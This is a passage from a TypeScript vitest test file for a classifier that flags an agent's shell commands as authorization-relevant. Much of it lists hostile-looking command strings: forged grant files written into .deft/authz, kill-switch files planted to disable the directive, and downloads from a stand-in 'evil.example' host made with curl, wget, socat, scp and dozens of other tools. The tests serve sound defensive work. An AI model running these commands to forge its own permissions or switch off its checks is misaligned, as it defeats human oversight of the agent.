import { describe, expect, it } from "vitest";
import { classifyHookAuthzOps, classifyShellAuthzOps } from "./classify.js";

describe("classifyShellAuthzOps (#2944)", () => {
  it("classifies push/merge via #2711 reuse", () => {
    expect(classifyShellAuthzOps("git push origin HEAD")).toContain("push");
    expect(classifyShellAuthzOps("gh pr merge 1 --squash")).toContain("merge");
  });

  it("classifies PR create/ready/edit without nested-quantifier regex", () => {
    expect(classifyShellAuthzOps("gh pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh pr ready 12")).toContain("pr");
    expect(classifyShellAuthzOps("gh.exe pr edit 3")).toContain("pr");
  });

  it("classifies issue create and test runners", () => {
    expect(classifyShellAuthzOps("gh issue create --title d")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("pnpm test")).toContain("test");
    expect(classifyShellAuthzOps("vitest run")).toContain("test");
    expect(classifyShellAuthzOps("go test ./...")).toContain("test");
  });

  it("classifies settings and deploy heuristics", () => {
    expect(classifyShellAuthzOps("gh repo edit --visibility private")).toContain("settings");
    expect(classifyShellAuthzOps("terraform apply -auto-approve")).toContain("deployment");
    expect(classifyShellAuthzOps("fly deploy")).toContain("deployment");
  });

  it("returns empty for unclassifiable non-product shell", () => {
    expect(classifyShellAuthzOps("git status")).toEqual([]);
    expect(classifyShellAuthzOps("")).toEqual([]);
    expect(classifyShellAuthzOps("   ")).toEqual([]);
  });

  it("maps hook tools", () => {
    expect(
      classifyHookAuthzOps({
        toolName: "Write",
        shellCommand: null,
        isDirectWrite: true,
      }),
    ).toEqual(["edit"]);
    expect(
      classifyHookAuthzOps({
        toolName: "Bash",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual([]);
    expect(
      classifyHookAuthzOps({
        toolName: "Bash",
        shellCommand: "git push",
        isDirectWrite: false,
      }),
    ).toContain("push");
    expect(
      classifyHookAuthzOps({
        toolName: "create_pull_request",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "create_issue",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
    expect(
      classifyHookAuthzOps({
        toolName: "Read",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual([]);
  });

  it("classifies gh with -R/--repo value flags before resource verb", () => {
    expect(classifyShellAuthzOps("gh -R owner/repo pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --repo owner/repo pr merge 1")).toContain("merge");
  });

  it("covers deploy/settings/api and env-prefixed shell", () => {
    expect(classifyShellAuthzOps("FOO=1 gh issue create --title t")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("env FOO=1 cargo test")).toContain("test");
    expect(classifyShellAuthzOps("npm test")).toContain("test");
    expect(classifyShellAuthzOps("yarn test")).toContain("test");
    expect(classifyShellAuthzOps("task test")).toContain("test");
    expect(classifyShellAuthzOps("helm upgrade chart")).toContain("deployment");
    expect(classifyShellAuthzOps("kubectl apply -f x.yaml")).toContain("deployment");
    expect(classifyShellAuthzOps("vercel deploy")).toContain("deployment");
    expect(classifyShellAuthzOps("gh api repos/o/r/issues")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("gh api repos/o/r/settings")).toContain("settings");
    expect(classifyShellAuthzOps("gh pr reopen 1")).toContain("pr");
    expect(
      classifyHookAuthzOps({
        toolName: "Shell",
        shellCommand: "git status",
        isDirectWrite: false,
      }),
    ).toEqual([]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__github__merge_pull_request",
        shellCommand: null,
        isDirectWrite: false,
        mcpArgsText: "{}",
      }),
    ).toContain("merge");
  });

  it("classifies authz:grant / uat-* / revoke as settings (#3110)", () => {
    for (const cmd of [
      "deft authz:grant -- --operations edit --cohort x",
      "task authz:grant -- --operations edit,push",
      "directive authz:grant --template finish-loop",
      "pnpm exec deft authz:grant -- --operations edit",
      "npx deft authz grant --operations edit",
      "deft authz:uat-start -- --campaign uat-1",
      "task authz:uat-suspend",
      "deft authz:revoke -- grant-abc",
      "env FOO=1 deft authz:grant --operations edit",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Read-only show stays unclassifiable (not authority mutation).
    expect(classifyShellAuthzOps("deft authz:show")).toEqual([]);
  });

  it("classifies shell writes under .deft/authz as settings (#3110 containment)", () => {
    expect(classifyShellAuthzOps('echo {"x":1} > .deft/authz/grants/evil.json')).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp /tmp/g.json .deft/authz/grants/g.json")).toContain("settings");
    expect(classifyShellAuthzOps("mv grant.json .deft/authz/state.json")).toContain("settings");
    expect(
      classifyShellAuthzOps("Set-Content -Path .deft\\authz\\state.json -Value '{}'"),
    ).toContain("settings");
    // General-purpose writers (not only redirect + write-bin allowlist).
    expect(classifyShellAuthzOps("dd if=/tmp/x of=.deft/authz/state.json")).toContain("settings");
    expect(classifyShellAuthzOps("sed -i s/a/b/ .deft/authz/state.json")).toContain("settings");
    expect(
      classifyShellAuthzOps("python -c \"open('.deft/authz/grants/x.json','w').write('{}')\""),
    ).toContain("settings");
    // Pure reads stay unclassifiable (inspect via authz:show / host Read).
    expect(classifyShellAuthzOps("cat .deft/authz/state.json")).toEqual([]);
    // Redirect **from** store to backup is not a store write (dest is /tmp).
    expect(classifyShellAuthzOps("cat .deft/authz/state.json > /tmp/backup")).toEqual([]);
    // Indirect $VAR expansion (opaque names included — residual fail-open closed).
    expect(classifyShellAuthzOps("echo '{}' > \"$AUTHZ_DIR/state.json\"")).toContain("settings");
    expect(classifyShellAuthzOps("cp /tmp/g.json $AUTHZ_HOME/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("printf '{}' > \"$STORE\"")).toContain("settings");
    // Ordinary expanded writes outside authz store stay unclassifiable.
    expect(classifyShellAuthzOps('echo hi > "$HOME/out"')).toEqual([]);
    expect(classifyShellAuthzOps('cp x "$TMPDIR/y"')).toEqual([]);
    // Command substitution destinations (no contiguous .deft/authz literal).
    expect(classifyShellAuthzOps('cp /tmp/evil.json "$(echo .deft)/authz/state.json"')).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp /tmp/x `pwd`/grants/y.json")).toContain("settings");
    // Destructive + opaque var; split path; positional expansion toward store.
    expect(classifyShellAuthzOps("rm -rf $STORE")).toContain("settings");
    expect(classifyShellAuthzOps("cd .deft && echo x > authz/state.json")).toContain("settings");
    // Later redirect must not hide an earlier split-path store write.
    expect(
      classifyShellAuthzOps("cd .deft && echo x > authz/state.json && echo y > /tmp/z"),
    ).toContain("settings");
    // Relative write after cd into authz dir (dest has no "authz" text).
    expect(classifyShellAuthzOps("cd .deft/authz && echo x > state.json")).toContain("settings");
    expect(classifyShellAuthzOps("cd .deft/authz && cp /tmp/g.json grants/evil.json")).toContain(
      "settings",
    );
    // Positional expansion alone + state.json is not enough without authz context.
    expect(classifyShellAuthzOps("echo '{}' > $1/state.json")).toEqual([]);
    // Authz-named expansion + state.json remains settings.
    expect(classifyShellAuthzOps("echo '{}' > \"$AUTHZ_DIR/state.json\"")).toContain("settings");
    // Programmatic os.environ / process.env write (no shell $ expansion).
    expect(
      classifyShellAuthzOps(
        "python -c \"import os; open(os.environ['DEFT_AUTHZ_ROOT']+'/state.json','w').write('{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "node -e \"require('fs').writeFileSync(process.env.AUTHZ_DIR+'/grants/x.json','{}')\"",
      ),
    ).toContain("settings");
    // Ordinary cleanup / non-store opaque dest stays unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("rm -rf $TMPDIR/build")).toEqual([]);
    expect(classifyShellAuthzOps("rm -rf $HOME/.cache/tmp")).toEqual([]);
    // Other destructive bins + opaque non-authz expansion stay unclassifiable.
    expect(classifyShellAuthzOps("unlink $TMPDIR/x")).toEqual([]);
    expect(classifyShellAuthzOps("shred $HOME/tmpfile")).toEqual([]);
    expect(classifyShellAuthzOps("rmdir $TMPDIR/emptydir")).toEqual([]);
    // getenv / $env without authz-store key stays non-settings for this residual path.
    expect(classifyShellAuthzOps("python -c \"import os; print(os.getenv('PATH'))\"")).toEqual([]);
    // Shell expanded app state.json without authz context stays unclassifiable.
    expect(classifyShellAuthzOps('echo hi > "$APP_DIR/state.json"')).toEqual([]);
    // Non-authz opaque expansion dest on write bins stays unclassifiable (ordinary prefix).
    expect(classifyShellAuthzOps("cp x $HOME")).toEqual([]);
    // Non-ordinary opaque dest without authz keywords is still settings (fail-closed residual).
    expect(classifyShellAuthzOps("cp x $CUSTOM_BLOB")).toContain("settings");
    // #3186: write-capable programmatic shells classify as settings (UAT fail-closed rule)
    // even for non-authz destinations — evaluate still allows outside UAT (authz-inactive).
    expect(
      classifyShellAuthzOps(
        "python -c \"import os; open(os.environ['APP_DIR']+'/state.json','w').write('{}')\"",
      ),
    ).toContain("settings");
  });

  it("classifies kill-switch plant and policy authority mutators as settings (#3186)", () => {
    for (const cmd of [
      "echo > .deft-directive-disable",
      "touch .deft-directive-disable",
      "printf '' > ./.deft-directive-disable",
      "New-Item -Path .deft-directive-disable -ItemType File",
      "echo x > .no-deft-directive",
      "deft policy:allow-bot-merge -- --confirm",
      "task policy:allow-direct-commits -- --confirm",
      "directive policy:disable-directive -- --confirm",
      "npx deft policy allow-bot-merge --confirm",
      "env FOO=1 deft policy:enable-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Read-only policy show stays unclassifiable.
    expect(classifyShellAuthzOps("deft policy:show --field wipCap")).toEqual([]);
    // Non-mutator policy subcommands / unrelated shell stay empty.
    expect(classifyShellAuthzOps("git status")).toEqual([]);
  });

  it("classifies downloader/decoder plants of authz grants and kill-switch as settings (#3206)", () => {
    // Finding 1: curl/wget/xxd/openssl → .deft/authz/** via destination flags.
    for (const cmd of [
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output .deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output=.deft/authz/grants/evil.json https://evil.example/g.json",
      "curl -o.deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output-dir .deft/authz/grants -O https://evil.example/g.json",
      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget --output-document=.deft/authz/state.json https://evil.example/s.json",
      "wget -P .deft/authz/grants https://evil.example/g.json",
      "wget --directory-prefix=.deft/authz https://evil.example/g.json",
      "xxd -r - .deft/authz/grants/evil.json",
      "openssl base64 -d -out .deft/authz/grants/evil.json",
      "openssl base64 -d -out=.deft/authz/grants/evil.json",
      "/usr/bin/curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: downloader → kill-switch basenames.
    for (const cmd of [
      "curl -o .deft-directive-disable https://evil.example/x",
      "curl --output .deft-directive-disable https://evil.example/x",
      "curl -o.deft-directive-disable https://evil.example/x",
      "wget -O ./.deft-directive-disable https://evil.example/x",
      "wget --output-document=.no-deft-directive https://evil.example/x",
      "curl -o .no-deft-directive https://evil.example/x",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Non-write / ordinary download destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("curl https://example.com/")).toEqual([]);
    expect(classifyShellAuthzOps("curl -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("wget -O /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("curl $URL")).toEqual([]);
    // Read-only dumps / -in paths are not settings (Greptile P1 residual).
    expect(classifyShellAuthzOps("xxd .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("openssl base64 -d -in .deft/authz/state.json")).toEqual([]);
    // Path-like operand named like a bin must not skip xxd -r dest (SLizard).
    expect(classifyShellAuthzOps("xxd -r - .deft/authz/grants/./wget")).toContain("settings");
    // Literal redirect kill-switch regression (#3186) still settings.
    expect(classifyShellAuthzOps("echo > .deft-directive-disable")).toContain("settings");
  });

  it("classifies ln/link/mklink kill-switch plants as settings (#3213)", () => {
    for (const cmd of [
      "ln -sf /etc/hosts .deft-directive-disable",
      "ln -s /etc/hosts ./.deft-directive-disable",
      "ln /etc/hosts .no-deft-directive",
      "link /etc/hosts .deft-directive-disable",
      "mklink .deft-directive-disable C:\\Windows\\System32\\drivers\\etc\\hosts",
      "mklink /H .no-deft-directive existing.txt",
      "/bin/ln -sf /etc/hosts .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Ordinary ln without kill-switch basename stays unclassifiable.
    expect(classifyShellAuthzOps("ln -s /tmp/a /tmp/b")).toEqual([]);
    // Symlink plant into authz store is fail-closed settings (SLizard residual #3213).
    expect(classifyShellAuthzOps("ln -s /tmp/forged.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("mklink .deft/authz/grants/evil.json C:\\tmp\\forged.json"),
    ).toContain("settings");
  });

  it("classifies scp/aria2c/certutil + quote-split authz plants as settings (#3213)", () => {
    for (const cmd of [
      "scp host:g.json .deft/authz/grants/evil.json",
      "scp user@host:g.json .deft/authz/grants/evil.json",
      "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "aria2c --dir=.deft/authz/grants -o evil.json https://evil.example/g.json",
      "aria2c -d.deft/authz/grants https://evil.example/g.json",
      "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
      // Quote-split: contiguous `.deft/authz` absent in raw command; pathish strips quotes.
      "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
      'cp /etc/hosts ".deft/"authz"/grants/evil.json"',
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Contiguous authz cp regression (#3110 / #3206).
    expect(classifyShellAuthzOps("cp /etc/hosts .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    // #3206 bins remain settings.
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    // Ordinary scp / aria2c destinations stay unclassifiable.
    expect(classifyShellAuthzOps("scp host:g.json /tmp/out.json")).toEqual([]);
    expect(classifyShellAuthzOps("aria2c -o out.json -d /tmp https://example.com/a")).toEqual([]);
    // Compound list must not drop the authz dest (Greptile P1 residual).
    expect(
      classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json ; echo ok"),
    ).toContain("settings");
    // Newline-separated compound (shellTokens emits `;` for `\n` — residual after `;` fix).
    expect(
      classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json\necho ok"),
    ).toContain("settings");
    // Glued operator (no space): strip op and end segment (Greptile residual).
    expect(classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json;echo ok")).toContain(
      "settings",
    );
    // Quoted operator in source must not end segment before real authz dest.
    expect(classifyShellAuthzOps("scp 'weird;name.json' .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("scp -o ProxyCommand=none host:g.json .deft/authz/grants/evil.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json && echo done",
      ),
    ).toContain("settings");
    // scp involving .deft/authz is fail-closed settings (source or dest) under UAT intent.
    expect(
      classifyShellAuthzOps("scp .deft/authz/state.json user@host:/tmp/backup.json"),
    ).toContain("settings");
    // Escaped unquoted op mid-source must not cut before protected dest (Greptile P1 #3213).
    expect(
      classifyShellAuthzOps("scp user@host:path\\;file .deft/authz/grants/evil.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("scp user@host:path\\&file .deft/authz/grants/evil.json"),
    ).toContain("settings");
    // Quoted bare op token is literal data — must not end segment before authz dest.
    expect(classifyShellAuthzOps("scp host:g.json ';' .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps('scp host:g.json ";" .deft/authz/grants/evil.json')).toContain(
      "settings",
    );
    // certutil + .deft/authz pathish is fail-closed settings even on read-ish subcommands
    // (UAT prefer deny; no dest-parser perfection thrash — #3213 operator design).
    expect(classifyShellAuthzOps("certutil -hashfile .deft/authz/state.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("certutil -dump .deft/authz/grants/x.json")).toContain("settings");
  });

  it("classifies archive/alt-downloader plants of authz grants and kill-switch as settings (#3245)", () => {
    // Finding 1: archive extractors + alt downloaders → .deft/authz/**
    for (const cmd of [
      "tar -xf archive.tar -C .deft/authz/grants",
      "tar -C .deft/authz/grants -xf archive.tar",
      "tar --directory=.deft/authz/grants -xf archive.tar",
      "bsdtar -xf a.tar -C .deft/authz/grants",
      "unzip -d .deft/authz/grants a.zip",
      "unzip -d.deft/authz/grants a.zip",
      "7z x a.7z -o.deft/authz/grants",
      "7za x a.7z -o.deft/authz/grants/evil",
      "rclone copy remote:x .deft/authz/grants/",
      "rclone copyto remote:g.json .deft/authz/grants/evil.json",
      "axel -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "axel --output .deft/authz/grants/evil.json https://evil.example/g.json",
      "fetch -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "socat - OPEN:.deft/authz/grants/evil.json",
      "socat TCP:evil:80 CREATE:.deft/authz/grants/evil.json",
      "lftp -e get x -o .deft/authz/grants/x",
      "/usr/bin/tar -xf a.tar -C .deft/authz/grants",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same bins → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "axel -o .deft-directive-disable https://evil.example/x",
      "fetch -o .deft-directive-disable https://evil.example/x",
      "rclone copy remote:x .deft-directive-disable",
      "socat - OPEN:.deft-directive-disable",
      "tar -xf a.tar .deft-directive-disable",
      "7z x a.7z -o.deft-directive-disable",
      "curl -o .deft-directive-disable https://evil.example/x",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Ordinary archive/download destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("tar -xf archive.tar -C /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("tar -tf archive.tar")).toEqual([]);
    expect(classifyShellAuthzOps("unzip -d /tmp/out a.zip")).toEqual([]);
    expect(classifyShellAuthzOps("rclone copy remote:x /tmp/out/")).toEqual([]);
    expect(classifyShellAuthzOps("axel -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("socat - OPEN:/tmp/out")).toEqual([]);
    // tar create (`-c`) must not treat the archive name as a chdir dest.
    expect(classifyShellAuthzOps("tar -cf /tmp/a.tar src")).toEqual([]);
    // #3206 / #3213 regressions remain settings.
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("ln -sf /etc/hosts .deft-directive-disable")).toContain(
      "settings",
    );
  });

  it("classifies crypto/alt-download residual plants of authz grants and kill-switch as settings (#3288)", () => {
    // Finding 1: residual bins → .deft/authz/**
    for (const cmd of [
      "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
      "gpg --output .deft/authz/grants/evil.json -d secret.gpg",
      "age -o .deft/authz/grants/evil.json -d secret.age",
      "age --output=.deft/authz/grants/evil.json -d secret.age",
      "zstd -o .deft/authz/grants/evil.json -d a.zst",
      "zstd --output .deft/authz/grants/evil.json -d a.zst",
      "sftp host:.deft/authz/grants/evil.json",
      "sftp host:g.json .deft/authz/grants/evil.json",
      "wget2 -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget2 -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget2 -P .deft/authz/grants https://evil.example/g.json",
      "http -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "http --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
      "yt-dlp -o .deft/authz/grants/evil.json https://evil.example/v",
      "yt-dlp --output .deft/authz/grants/evil.%(ext)s https://evil.example/v",
      "aria2 -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "aria2 --dir=.deft/authz/grants -o evil.json https://evil.example/g.json",
      "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
      "cpio -id -D .deft/authz/grants",
      "cpio -i --directory=.deft/authz/grants",
      "cpio -i --directory .deft/authz/grants",
      "cpio -id -D.deft/authz/grants",
      "wget2 -P.deft/authz/grants https://evil.example/g.json",
      "wget2 --directory-prefix=.deft/authz/grants https://evil.example/g.json",
      "aria2 -d.deft/authz/grants https://evil.example/g.json",
      "aria2 --dir .deft/authz/grants -o evil.json https://evil.example/g.json",
      "unzstd -o .deft/authz/grants/evil.json a.zst",
      "ytdlp -o .deft/authz/grants/evil.json https://evil.example/v",
      "https -o .deft/authz/grants/evil.json GET https://evil.example/g.json",
      "gpg.exe -o .deft/authz/grants/evil.json -d secret.gpg",
      "/usr/bin/gpg -o .deft/authz/grants/evil.json -d secret.gpg",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same bins → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "gpg -o .deft-directive-disable -d secret.gpg",
      "age -o .deft-directive-disable -d secret.age",
      "zstd -o .deft-directive-disable -d a.zst",
      "yt-dlp -o .deft-directive-disable https://evil.example/v",
      "wget2 -O .no-deft-directive https://evil.example/x",
      "http -o .deft-directive-disable https://evil.example/x",
      "mbuffer -i in.bin -o .deft-directive-disable",
      "sftp host:.deft-directive-disable",
      "aria2 -o .deft-directive-disable https://evil.example/x",
      "cpio -id -D .deft-directive-disable",
      "cpio -id .no-deft-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("gpg -o /tmp/out.json -d secret.gpg")).toEqual([]);
    expect(classifyShellAuthzOps("age -o /tmp/out -d secret.age")).toEqual([]);
    expect(classifyShellAuthzOps("zstd -o /tmp/out -d a.zst")).toEqual([]);
    expect(classifyShellAuthzOps("wget2 -O /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("yt-dlp -o /tmp/out https://example.com/v")).toEqual([]);
    expect(classifyShellAuthzOps("aria2 -o out.json -d /tmp https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("cpio -id -D /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("mbuffer -i in.bin -o /tmp/out")).toEqual([]);
    // cpio create (`-o`) must not treat archive name / flags as file dest.
    expect(classifyShellAuthzOps("cpio -o > /tmp/a.cpio")).toEqual([]);
    // #3245 / #3213 / #3206 regressions remain settings.
    expect(classifyShellAuthzOps("tar -xf archive.tar -C .deft/authz/grants")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
  });

  it("classifies versioned/alt residual plants of authz grants and kill-switch as settings (#3311)", () => {
    // Finding 1: residual bins → .deft/authz/**
    for (const cmd of [
      "gpg2 -o .deft/authz/grants/evil.json -d secret.gpg",
      "gpg2 --output .deft/authz/grants/evil.json -d secret.gpg",
      "gpg1 -o .deft/authz/grants/evil.json -d secret.gpg",
      "rage -d -o .deft/authz/grants/evil.json secret.age",
      "rage --output=.deft/authz/grants/evil.json -d secret.age",
      "xh -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "xh --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
      "xh --download-dir .deft/authz/grants https://evil.example/g.json",
      "httpie -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "httpie --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
      "wcurl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "wcurl --output .deft/authz/grants/evil.json https://evil.example/g.json",
      "curlie -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "curlie --output .deft/authz/grants/evil.json https://evil.example/g.json",
      "uudecode -o .deft/authz/grants/evil.json encoded.uu",
      "uudecode --output-file .deft/authz/grants/evil.json encoded.uu",
      "uudecode --output-file=.deft/authz/grants/evil.json encoded.uu",
      "iconv -o .deft/authz/grants/evil.json -f utf-8 -t utf-8 src.json",
      "iconv --output .deft/authz/grants/evil.json src.json",
      "gtar -xf archive.tar -C .deft/authz/grants",
      "gtar -C .deft/authz/grants -xf archive.tar",
      "gtar --directory=.deft/authz/grants -xf archive.tar",
      "star -xf archive.tar -C .deft/authz/grants",
      "star -C .deft/authz/grants -xf archive.tar",
      "gnutar -xf archive.tar -C .deft/authz/grants",
      "pax -r -f archive.pax .deft/authz/grants/evil.json",
      "gpg2.exe -o .deft/authz/grants/evil.json -d secret.gpg",
      "/usr/bin/gpg2 -o .deft/authz/grants/evil.json -d secret.gpg",
      "/usr/bin/rage -d -o .deft/authz/grants/evil.json secret.age",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: same bins → kill-switch basenames (regular-file plant).
    for (const cmd of [
      "gpg2 -o .deft-directive-disable -d secret.gpg",
      "rage -d -o .deft-directive-disable secret.age",
      "xh -o .deft-directive-disable https://evil.example/x",
      "httpie -o .deft-directive-disable https://evil.example/x",
      "wcurl -o .no-deft-directive https://evil.example/x",
      "curlie -o .deft-directive-disable https://evil.example/x",
      "uudecode -o .deft-directive-disable encoded.uu",
      "iconv -o .deft-directive-disable src.txt",
      "gtar -xf a.tar -C .deft-directive-disable",
      "star -xf a.tar .deft-directive-disable",
      "pax -r .no-deft-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Already-denied #3288 peers stay settings.
    expect(classifyShellAuthzOps("gpg -o .deft/authz/grants/evil.json -d secret.gpg")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("age -o .deft/authz/grants/evil.json -d secret.age")).toContain(
      "settings",
    );
    expect(
      classifyShellAuthzOps("http -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    expect(classifyShellAuthzOps("tar -xf archive.tar -C .deft/authz/grants")).toContain(
      "settings",
    );
    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("gpg2 -o /tmp/out.json -d secret.gpg")).toEqual([]);
    expect(classifyShellAuthzOps("rage -d -o /tmp/out secret.age")).toEqual([]);
    expect(classifyShellAuthzOps("xh -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("httpie -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("wcurl -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("curlie -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("uudecode -o /tmp/out encoded.uu")).toEqual([]);
    expect(classifyShellAuthzOps("iconv -o /tmp/out src.txt")).toEqual([]);
    expect(classifyShellAuthzOps("gtar -xf archive.tar -C /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("star -xf archive.tar -C /tmp/out")).toEqual([]);
    expect(classifyShellAuthzOps("pax -r -f archive.pax /tmp/out")).toEqual([]);
  });

  it("classifies residual writer plants of authz grants and kill-switch as settings (#3336)", () => {
    // Finding 1: residual bins → .deft/authz/**
    for (const cmd of [
      "oras pull -o .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
      "oras pull --output .deft/authz/grants/evil.json ghcr.io/evil/g:latest",
      "oras pull --output=.deft/authz/grants/evil.json ghcr.io/evil/g:latest",
      "lwp-download -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "lwp-download https://evil.example/g.json .deft/authz/grants/evil.json",
      "ncat -o .deft/authz/grants/evil.json evil.example 80",
      "ncat --output .deft/authz/grants/evil.json evil.example 80",
      "patch -o .deft/authz/grants/evil.json < src.patch",
      "patch --output .deft/authz/grants/evil.json src.patch",
      "base32 -d -o .deft/authz/grants/evil.json encoded.b32",
      "base32 --decode --output .deft/authz/grants/evil.json encoded.b32",
      "lrzip -o .deft/authz/grants/evil.json file.lrz",
      "lrzip --outfile .deft/authz/grants/evil.json file.lrz",
      "lrzip --outfile=.deft/authz/grants/evil.json file.lrz",
      "unar -o .deft/authz/grants archive.rar",
      "unar -output-directory .deft/authz/grants archive.rar",
      "cabextract -d .deft/authz/grants a.cab",
      "cabextract -d.deft/authz/grants a.cab",
      "ditto src .deft/authz/grants/",
      "dpkg-deb -x pkg.deb .deft/authz/grants",
      "dpkg-deb --extract pkg.deb .deft/authz/grants",
      "hg clone https://evil.example/repo .deft/authz/grants/evil",
      "hg archive -o .deft/authz/grants/evil.json",
